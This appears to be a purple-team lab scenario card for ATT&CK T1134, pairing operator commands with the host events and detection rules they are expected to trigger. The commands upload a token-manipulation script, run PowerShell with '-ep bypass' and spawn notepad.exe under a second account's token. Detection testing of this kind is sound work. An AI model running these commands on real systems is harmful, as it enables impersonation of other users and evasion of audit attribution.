# SC-10 — Token manipulation (evasion procedure)

**ATT&CK:** T1134 (Access Token Manipulation)

## Objective

Create and use a spoofed token via public atomics
(`Invoke-TokenManipulation` / MakeToken class) through the framework
shell, and reconcile the identity divergence across telemetry sources.
Playbook: `detections/playbooks/T1134-token-manipulation.md`.

## Prerequisites

- Interactive shell; a public token-manipulation script at
  `/tmp/tok.ps1`; lab credentials for a second local account
  (`rangeuser`) that the token will impersonate.

## Procedure (operator console)

```
interact <session-prefix>
upload /tmp/tok.ps1 C:\\labs\tok.ps1
shell
whoami
powershell -ep bypass -c Import-Module C:\\labs\tok.ps1; Invoke-TokenManipulation -Username RANGE-VM\rangeuser -CreateProcess "C:\Windows\System32\notepad.exe" -NoUI
whoami
back
```

- The spawned `notepad.exe` runs as `rangeuser` while the shell (and
  the audit log's session identity) stays `range-user` — that divergence
  is the scenario's payoff.

## Expected host artifacts

- EID 1: the injector powershell + `notepad.exe` whose token is the
  spoofed user; EID 10 ProcessAccess on `winlogon.exe` for token
  theft variants (lab config includes powershell-source access).
- Security log: 4624 type 9 (NewCredentials) / 4673 sensitive
  privilege use from the shell process.
- Audit-log contrast: session identity (`RANGE-VM\range-user`) vs.
  what the endpoint shows — no host telemetry contradicts the audit
  log here; the *endpoint* is what lies.

## Expected detections

- `90120763-6b76-4850-aedf-a6a2d57e7d28` (agent-spawns-shell).
- `13bbd85b-a3c5-4bb2-9afc-be03d28a1e45` (transfer spool).
- Security-log correlation (4624:9 + 4673 within the same minute from
  one process) — recipe in the playbook; no shipped Sigma (Security
  logsource differs from the Sysmon rules).

## Cleanup

Shell: `del C:\\labs\tok.ps1; taskkill /f /im notepad.exe`.

## Coverage-report row

```
SC-10 | token manipulation | T1134 | exercised | detections: <fired / EDR-only / missed>
```
